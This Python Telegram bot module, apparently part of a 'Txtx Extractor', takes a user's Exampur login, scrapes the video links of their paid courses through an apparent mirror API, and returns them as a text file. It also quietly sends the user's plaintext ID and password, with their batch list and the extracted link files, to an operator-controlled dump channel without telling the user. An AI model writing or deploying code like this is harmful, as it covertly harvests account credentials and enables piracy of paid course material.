# MIT License
#
# Copyright (c) 2019-present Dan <https://github.com/delivrance>
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE
# Code edited By Cryptostark

import urllib.parse
import requests
import json
import datetime
import pytz
import re
import aiofiles
import os
from pyrogram import filters, Client as bot
from pyrogram.types import Message
import cloudscraper
import asyncio

# Fallback for CHANNEL_ID if config is unavailable
try:
    from config import CHANNEL_ID
    txt_dump = CHANNEL_ID
except ImportError:
    txt_dump = None  # Replace with your Telegram channel ID (e.g., -1001234567890) or remove txt_dump usage

appname = "Exampur2"

async def wait_for_message(bot: bot, chat_id: int, timeout: int = 300) -> Message:
    """Custom listener to wait for a message in the specified chat."""
    future = asyncio.Future()
    
    @bot.on_message(filters.chat(chat_id) & filters.text)
    async def handle_message(client, message: Message):
        if not future.done():
            future.set_result(message)
            await client.remove_handler(handle_message)
    
    try:
        message = await asyncio.wait_for(future, timeout=timeout)
        return message
    except asyncio.TimeoutError:
        raise TimeoutError("No message received within the timeout period")

@bot.on_message(filters.command(["exampur2"]))
async def account_login(bot: bot, m: Message):
    editable = await m.reply_text(
        "Send **ID & Password** in this manner otherwise app will not respond.\n\nSend like this:-  **ID*Password**")
    
    input1 = await wait_for_message(bot, m.chat.id)
    raw_text = input1.text
    await input1.delete()
    
    rwa_url = "https://auth.exampurcache.xyz/auth/login"
    hdr = {
        "appauthtoken": "no_token",
        "User-Agent": "Dart/2.15(dart:io)",
        "content-type": "application/json; charset=UTF-8",
        "Accept-Encoding": "gzip",
        "host": "auth.exampurcache.xyz"
    }
    info = {"phone_ext": "91", "phone": "", "email": "", "password": ""}
    
    if '*' in raw_text:
        info["email"], info["password"] = raw_text.split("*")
    else:
        await editable.edit("**Please Send id password in this manner** \n\n**Id*Password")
        return

    scraper = cloudscraper.create_scraper()
    res = scraper.post(rwa_url, data=info).content
    output = json.loads(res)
    token = output["data"]["authToken"]
    hdr1 = {
        "appauthtoken": token,
        "User-Agent": "Dart/2.15(dart:io)",
        "Accept-Encoding": "gzip",
        "host": "auth.exampurcache.xyz"
    }
    
    if output.get("status") == "success":
        await editable.edit("**User authentication successful.**")
    else:
        await editable.edit(f'Login Failed - {output.get("message", "Unknown error")}')
        return

    res1 = requests.get("https://auth.exampurcache.xyz/mycourses", headers=hdr1)
    b_data = res1.json()['data']
    cool = ""
    FFF = "**BATCH-ID - BATCH NAME - INSTRUCTOR**"
    Batch_ids = ''
    for data in b_data:
        id = data['id']
        batch = data['batchName']
        instructor = data['instructorName']
        aa = f" `{id}`      - **{batch} ✳️ {instructor}**\n\n"
        if len(f'{cool}{aa}') > 4096:
            cool = ""
        cool += aa
        Batch_ids += str(id) + '&'
    Batch_ids = Batch_ids.rstrip('&')
    
    login_msg = f'<b>{appname} Login Successful ✅</b>\n'
    login_msg += f'\n<b>ID Password :- </b><code>{raw_text}</code>\n\n'
    login_msg += f'\n\n<b>BATCH ID ➤ BATCH NAME</b>\n\n{cool}'
    if txt_dump:
        copiable = await bot.send_message(txt_dump, login_msg)
    await editable.edit(f'{"**You have these batches :-**"}\n\n{FFF}\n\n{cool}')
    
    editable1 = await m.reply_text(f"**Now send the Batch ID to Download**\n\n**For All batch -** `{Batch_ids}`")
    input2 = await wait_for_message(bot, m.chat.id)
    raw_text2 = input2.text
    await input2.delete()
    await editable.delete()
    await editable1.delete()
    
    if "&" in raw_text2:
        batch_ids = raw_text2.split('&')
    else:
        batch_ids = [raw_text2]
    
    for batch_id in batch_ids:
        start_time = datetime.datetime.now()
        bname = next((x['batchName'] for x in b_data if str(x['id']) == batch_id), None)
        scraper = cloudscraper.create_scraper()
        html = scraper.get(f"https://auth.exampurcache.xyz/course_subject/{batch_id}", headers=hdr1).content
        output0 = json.loads(html)
        subjID = output0["data"]
        all_urls = []
        
        for data in subjID:
            t = data["_id"]
            topicName = data["title"]
            xx = await m.reply_text(f"<b><i>Sir Task Started** ✳️</b></i>")
            try:
                await xx.edit(f"**(Processing Topic-** `{topicName}`")
            except Exception as e:
                print(f"Error occurred while editing topic name: {e}")
            
            res4 = requests.get(f"https://auth.exampurcache.xyz/course_material/chapter/{t}/{batch_id}", headers=hdr1)
            b_data2 = res4.json()['data']
            
            for i in range(0, len(b_data2)):
                tids = b_data2[i]
                encoded_URL = urllib.parse.quote(tids, safe="")
                chapter = encoded_URL.replace("%28", "(").replace("%29", ")").replace("%26", "&")
                res5 = requests.get(f"https://auth.exampurcache.xyz/course_material/material/{t}/{batch_id}/{chapter}", headers=hdr1)
                b_data3 = res5.json()['data']
                
                for item in b_data3:
                    title = item["title"].replace("||", "-").replace(":", "-")
                    url = item.get("video_link")
                    if url:
                        cc = f'{title}: {url}'
                        all_urls.append(cc)
        
        await xx.edit("**Scraping completed successfully!**")
        if all_urls:
            await login(bot, m.chat.id, m, all_urls, start_time, bname, batch_id, app_name="Exampur2")
        await xx.delete()

async def login(bot: bot, user_id: int, m: Message, all_urls: list, start_time, bname: str, batch_id: str, app_name: str):
    bname = re.sub(r'[\\/:*?"<>|\t\n\r]+', '', bname).strip()[:50]
    file_path = f"{bname}.txt"
    end_time = datetime.datetime.now()
    duration = end_time - start_time
    minutes, seconds = divmod(duration.total_seconds(), 60)
    user = await bot.get_users(user_id)
    contact_link = f"[{user.first_name}](tg://openmessage?user_id={user_id})"
    all_text = "\n".join(all_urls)
    video_count = len(re.findall(r'\.(m3u8|mpd|mp4)', all_text))
    pdf_count = len(re.findall(r'\.pdf', all_text))
    drm_video_count = len(re.findall(r'\.(videoid|mpd|testbook)', all_text))
    credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})\n\n"
    caption = f"**APP NAME :** {app_name} \n\n **Batch Name :** {batch_id} - {bname} \n\n TOTAL LINK - {len(all_urls)} \n Video Links - {video_count - drm_video_count} \n Total Pdf - {pdf_count} \n **Extracted BY:{credit}** \n\n  **╾───• Txtx Extractor •───╼**  "
    async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
        await f.writelines([url + '\n' for url in all_urls])
    copy = await m.reply_document(document=file_path, caption=caption)
    if txt_dump:
        await bot.send_document(txt_dump, file_path, caption=caption)
    os.remove(file_path)
